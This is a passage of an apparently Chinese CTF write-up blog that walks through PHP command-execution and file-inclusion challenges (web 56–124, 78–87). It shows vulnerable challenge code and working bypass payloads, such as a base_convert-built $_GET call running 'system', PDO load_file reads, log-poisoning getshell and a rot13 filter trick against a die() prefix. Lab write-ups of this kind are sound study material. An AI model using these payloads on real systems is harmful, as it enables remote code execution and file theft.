class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了数字</p>
<p>也可以用上面的方法</p>
<h3 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    flag在<span class="number">36</span>.php中</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了上面的方法</p>
<p>涉及到了linux的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;_&#125; =<span class="string">&quot;&quot;</span> //返回上一次命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;_&#125;</span>))=0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((<span class="variable">$&#123;_&#125;</span>))))=-1</span></span><br><span class="line">payload：</span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构成-36取反就好了</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">突破禁用命令的方法：</span><br><span class="line">1、通过复制，重命名读取php文件内容		函数：copy、rename</span><br><span class="line">2、单一函数读文件内容：			  函数：file_get_contents()[搭配echo]		readfile()  	file()[搭配peint_r]</span><br><span class="line">3、通过fopen读文件内容：				</span><br><span class="line">函数：</span><br><span class="line">fread()		用法：$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);          </span><br><span class="line">fgets()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">fgetc()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">fgetss()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125;//php7.3后无法使用</span><br><span class="line">fgetcsv()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">gpassthru()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); </span><br><span class="line">4、高亮：		函数：	show_source()	highlight_file()</span><br><span class="line">5、flag不在flag.php中，遍历目录：		函数：		scandir() 	opendir()</span><br><span class="line">6、flag是txt直接包含：		函数： 	include()		require()</span><br><span class="line">7、绕过之前的正则：在后面接exit();</span><br><span class="line">8、绕过open_basedir：   函数：</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是禁用了system好像，可以用highlight_file()绕过</p>
<p>也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">readfile(&quot;flag.php&quot;);        </span><br></pre></td></tr></table></figure>



<h3 id="web-59"><a href="#web-59" class="headerlink" title="web 59"></a>web 59</h3><p>同样的数据</p>
<p>也没有过滤highlight_file()</p>
<p>也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br></pre></td></tr></table></figure>

<h3 id="web-60"><a href="#web-60" class="headerlink" title="web 60"></a>web 60</h3><p>见web58</p>
<p>也可以<code>（rename）copy(&quot;flag.php&quot;,&quot;flag.txt&quot;)</code>访问</p>
<h3 id="web-61-65"><a href="#web-61-65" class="headerlink" title="web 61-65"></a>web 61-65</h3><p>高亮</p>
<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>使用高亮发现flag不在这里，使用目录遍历</p>
<p><code>print_r(scandir(&#39;.&#39;));</code></p>
<p>发现flag在根目录下的flag.txt中</p>
<p>然后用高亮显示</p>
<p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h3 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h3><p><code>print_r</code>被禁，用var_dump代替</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h3><p>发现高亮被过滤，但是可以继续遍历目录</p>
<p>flag还是在根目录下</p>
<p>因为他是txt文件，直接include这个文件他就会直接在网页中显示</p>
<h3 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69-70"></a>web 69-70</h3><p> <code>var_dump</code>被禁用,可以用<code>var_export</code>替代</p>
<h3 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h3><p>使用上面方法的时候发现，全是问号</p>
<p>但是遍历根目录的时候可以发现????.???猜测是flag.txt</p>
<p>读取这个方法也全是问号，想到用utf-8编码看一下是不是编码问题</p>
<p>查看源代码发现下面有一层过滤</p>
<p>可以用exit();跳过这层过滤</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h3><h3 id="web-73"><a href="#web-73" class="headerlink" title="web 73"></a>web 73</h3><p>先用var_export遍历一下目录发现根目录下面的flagc.txt文件</p>
<p>然后include包含这个文件就可以</p>
<h3 id="web-74"><a href="#web-74" class="headerlink" title="web 74"></a>web 74</h3><p>这里过滤掉了dir相关的函数</p>
<p>用glob函数过</p>
<p>使用方法：``</p>
<p>glob(‘./*’)遍历当前目录下的文件</p>
<h3 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75-76"></a>web 75-76</h3><p>用到了php中保存目录的类：Directoryiterator</p>
<p>DirectoryIterator 类提供了一个简单的界面来查看文件系统目录的内容。</p>
<p>我们可以直接在网页中编写实例一个DirectoryIterator对象，然后用一个循环遍历出它里面包含的文件</p>
<p>payload：</p>
<p><code>?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f-&gt;__toString().&quot; &quot;;&#125;exit();</code></p>
<p>可以找到flag36.txt文件</p>
<p>这里需要用到PDO类链接数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php页面链接数据库例子：</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">dbms=<span class="string">&#x27;mysql&#x27;</span>;     //数据库类型</span></span><br><span class="line"><span class="meta">$</span><span class="bash">host=<span class="string">&#x27;localhost&#x27;</span>; //数据库主机名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbName=<span class="string">&#x27;test&#x27;</span>;    //使用的数据库</span></span><br><span class="line"><span class="meta">$</span><span class="bash">user=<span class="string">&#x27;root&#x27;</span>;      //数据库连接用户名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pass=<span class="string">&#x27;&#x27;</span>;          //对应的密码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dsn=<span class="string">&quot;<span class="variable">$dbms</span>:host=<span class="variable">$host</span>;dbname=<span class="variable">$dbName</span>&quot;</span>;</span></span><br></pre></td></tr></table></figure>

<p>所以我们现在需要初始化的内容<code>$dbh = new PDO($dsn, $user, $pass); *//初始化一个PDO对象*</code></p>
<p>需要提供账号密码还有数据库信息</p>
<p>也不知道师傅们是怎么拿到数据库的信息的：</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;<span class="comment">#76是36d</span></span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>



<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
<p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>一样可以用上面的代码读取到文件目录，可以看到flag在falg36x.txt或者readflag中</p>
<p>但是我们用上面的sql方法读取文件的时候发现，sql被ban了，得想另一种办法</p>
<p>可以利用FFI（但是FFI只有在php7.4之后才有）</p>
<p>新姿势：$ffi = FFI::cdef(“int system(const char *command);”);创建一个system对象</p>
<p>然后将readflag重定向</p>
<p>最后调用system执行$a</p>
<p>最后访问我们重定向的文件</p>
<h3 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h3><p>这题又是一个新姿势，我们可以利用环境变量或者路径含有的字母来执行命令</p>
<p>这题没有过滤空格还有路径包含</p>
<p>而且给出的提示中有当前目录是/var/www/html</p>
<p>以及环境变量是/bin</p>
<p>我们可以调用环境变量的最后一个字母（~A）以及当前目录中最后一个字母组成nl后面包含题目给我们的flag所在位置（？没有被ban）</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH~A&#125;<span class="variable">$&#123;PWD~A&#125;</span>????.???</span></span><br></pre></td></tr></table></figure>

<p>附上LINUX的环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查看环境变量  (environment)</span><br><span class="line">env</span><br><span class="line">一些环境变量说明</span><br><span class="line">HOSTNAME=linux.dmtsai.tw  主机名称</span><br><span class="line">SHELL=/bin/bash  当前环境下，使用的shell是哪一个程序。</span><br><span class="line">TERM=xterm  终端使用的环境是什么类型</span><br><span class="line">HISTSIZE=1000 记录命令的数目</span><br><span class="line">USER=root  用户的名称</span><br><span class="line">ENV=/root/.bashrc  使用的个人环境设置文件</span><br><span class="line">MAIL=/var/spool/mail/root  这个用户所采用的邮箱位置</span><br><span class="line">PATH=/sbin:/usr/sbin:/bin  执行文件命令搜索路径</span><br><span class="line">PWD=/root  当前用户所在的工作目录(利用pwd取出)</span><br><span class="line">LANG=en_US,UTF-8 与语系有关</span><br><span class="line">HOME=/root 用户的家目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web-119"><a href="#web-119" class="headerlink" title="web 119"></a>web 119</h3><p>跟上题类似但是需要构造不一样的东西上题构造的是无法用的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#&#125;</span></span></span><br><span class="line">1:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#SHLVL&#125;</span></span></span><br><span class="line">4-5:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#RANDOM&#125;</span></span></span><br><span class="line">/:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span></span><br><span class="line">t:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI</span><br><span class="line">LE_OFFSET_BITS=64</span><br><span class="line">2</span><br><span class="line">3 PHP_VERSION=7.3.22 /版本</span><br><span class="line">4 SHLVL=2 /記錄多個bash進程實例嵌套深度的累加器</span><br><span class="line">5 [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">6 [HOSTNAME] =&gt; glot-runner /主機名</span><br><span class="line">[PHPIZE_DEPS] =&gt; autoconf dpkg-dev file g++</span><br><span class="line">gcc libc-dev make pkg-config re2c</span><br><span class="line">7</span><br><span class="line">8 [PHP_INI_DIR] =&gt; /usr/local/etc/php</span><br><span class="line">9 [PHP_CFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">10 [PHP_CPPFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">11 [PHP_LDFLAGS] =&gt; -Wl,-O1 -Wl,--hash-style=both -pie</span><br><span class="line">[GPG_KEYS] =&gt; 1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2</span><br><span class="line">D6021E995DC9FF8D3EE5AF27F</span><br><span class="line">12</span><br><span class="line">13 [PHP_VERSION] =&gt; 7.2.1</span><br><span class="line">14</span><br><span class="line">[PHP_ASC_URL] =&gt; https://secure.php.net/get/php-7.2.1.tar.xz.asc/from/</span><br><span class="line">this/mirror</span><br><span class="line">15</span><br><span class="line">[PHP_SHA256] =&gt; 6c6cf82fda6660ed963821eb0525214bb3547e8e29f447b9c15b2d</span><br><span class="line">8e6efd8822</span><br><span class="line">16</span><br><span class="line">17 [PHP_MD5] =&gt;</span><br><span class="line">18 [HOME] =&gt; /home/glot</span><br><span class="line">19 [PHP_SELF] =&gt; /tmp/543750210/main.php</span><br><span class="line">20 [SCRIPT_NAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">21 [SCRIPT_FILENAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">22 [PATH_TRANSLATED] =&gt; /tmp/543750210/main.php</span><br><span class="line">23 [DOCUMENT_ROOT] =&gt;</span><br><span class="line">24 [REQUEST_TIME_FLOAT] =&gt; 1524198667.12</span><br><span class="line">25 [REQUEST_TIME] =&gt; 1524198667</span><br><span class="line">26 [argv] =&gt; Array</span><br><span class="line">27 (</span><br><span class="line">28 [0] =&gt; /tmp/543750210/main.php</span><br><span class="line">29 )</span><br><span class="line">30 [argc] =&gt; 1</span><br><span class="line">31 )</span><br></pre></td></tr></table></figure>

<p>非预期：</p>
<p>可以看到PHP_CFLAGS中含有tac，直接构造数字3取PHP_CFLAGS的第三个的三位就行了</p>
<h3 id="web-120"><a href="#web-120" class="headerlink" title="web 120"></a>web 120</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span></span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>上面的题目虽然没有过滤，但是我们用的长度太长了会被后面的小于65pass</p>
<p>所以我们的换一种方法构造</p>
<p>可以尝试一下构造base64</p>
<p>我们只需要构造出4和6</p>
<p>我们还记得118的提示</p>
<p>然后PHP_VERSION的长度是6</p>
<p>pwd的长度是4</p>
<p>可以构造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">????$&#123;#PWD&#125; ????.???  #base64 flag.php</span><br></pre></td></tr></table></figure>

<p>但是没办法执行，应该是位置发生了什么变化把，换一种方法，构造出/bin然后直接执行看看</p>
<p>想到可以构造/bin/base64 ????.???</p>
<p>现在的问题就是构造一个/</p>
<p>可以用pwd的第一个字符就是/</p>
<p><code>$&#123;PWD::$</code>的效果跟他一样的直接替换</p>
<p>替换之后用上面的payload继续打</p>
<h3 id="web-122"><a href="#web-122" class="headerlink" title="web 122"></a>web 122</h3><p>可以看到我们用pwd提取/但是pwd被过滤了</p>
<p>发现没有过滤HOME，而且HOME返回的是家目录也是含有/但是#也被过滤了查了一下可以用<code>$?</code>，它表示上一条命令的返回值，如果是0则表示执行成功，如果是非0则表示执行有误</p>
<p>用<code>$&#123;HOME::$?&#125;</code></p>
<h3 id="web-124"><a href="#web-124" class="headerlink" title="web 124"></a>web 124</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这道题同样限制了长度，并且添加了黑白名单：</p>
<p>过滤了<code>空格，换行，tab，单双引号还有中括号</code></p>
<p>他特别提示了用到数学符号，而且在这边给出了进制转换的几个函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base_convert随机进制转换</span><br><span class="line">hexdec十六进制转换成十进制</span><br><span class="line">dechex十进制转换成十六进制</span><br><span class="line">原本只需要base_convert就足够了，但是这题同样限制了80长度，只用这个的话长度不够，所以我们必须结合利用</span><br><span class="line">我们知道我们在执行的时候是以二进制数据进行程序执行的</span><br><span class="line">所以我们可以构造rce</span><br><span class="line">以GET方式传入一个数，然后我们就可以随机构造我们想要的系统命令了</span><br></pre></td></tr></table></figure>

<p>可以看到我们直可以用它给的函数还有数字，还有除了上面其余符号，</p>
<p>我们可以构造一个十进制，然后让他转换成二进制字符串，但是上面没有给我们函数来转换成2进制字符串</p>
<p>所以说我们需要构造一个参数让他转换成2进制字符串</p>
<p>看了一下他给的数学函数需要返回字符串的话我们只能使用</p>
<p><code>hex2bin</code>函数，这个函数会将16进制转换成二进制字符串</p>
<p>也就是说我们需要用base_convert转换出hex2bin</p>
<p>直接去找一个在线网站转换就行了<code>37907361743</code></p>
<p>然后构造base_convert(37907361743,10,36)就可以构造出hex2bin</p>
<p>然后我们就可以构造一个_GET了</p>
<p>1598506324</p>
<p>然后直接拼接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))#_GET</span><br></pre></td></tr></table></figure>

<p>这样我们就构造好了_GET因为中括号被过滤了我们可以用大括号代替中间的就用上面给定的函数来覆盖，</p>
<p>可以构造$pi=base_convert(37907361743,10,36)(dechex(1598506324))</p>
<p>因为长度限定我们可以使用变量定义一下，把这个复制给$pi</p>
<p>然后用$$pi构造出$_GET{abs}，但是因为我们没办法使用单引号，所以我们还需要构造一个参数，然后让他组成<code>函数（参数）</code>的方式，然后函数，参数都用get传入</p>
<p>也就是说需要构造<code>c=$_GET&#123;abs&#125;（$_GET&#123;exp&#125;）</code>然后我们再传入abs还有exp就可以rce</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;);&amp;abs=system&amp;exp=tac f*</span><br></pre></td></tr></table></figure>

<h2 id="——命令执行结束——"><a href="#——命令执行结束——" class="headerlink" title="——命令执行结束——"></a>——命令执行结束——</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><p>用php伪协议</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><p>用data伪协议</p>
<h3 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h3><p>随便输入一个页面查看服务器的系统</p>
<p>用file伪协议抓包之后在网页的标头信息构造漏洞在日志文件中getshell</p>
<h3 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h3><p>直接file=文件的日志文件</p>
<p>然后抓包构造标头</p>
<h3 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h3><p>环境有问题，现在没办法做</p>
<h3 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要写入content数据写进file中，但是要绕过这个die</p>
<p>考到了伪协议绕过，我们可以用伪协议编码绕过，用base64或者是rot13base64解码的时候<?;>等会被忽略，最后也就会变成phpdie然后添加两个字符之后对后面的数再继续进行解码这样我们就直接绕过了这个死亡杂糅（我这题base64没做出来，用的rot13）rot13编码之后` <?php die('大佬别秀了');?><code>会变成</code><?cuc qvr('大佬别秀了');?>`再进行一次编码他就会恢复原状，如果php没有开启短标签的话，php不认识这个字符那么他就不会执行，我们直接在后面添加我们想要输入的代码然后进行一次rot13编码，当他在进行一次rot13编码的时候，他就会变成我们想要输入的原始形态，就绕过了前面的die不会退出。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/8163#toc-3</span><br><span class="line">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</span><br></pre></td></tr></table></figure>



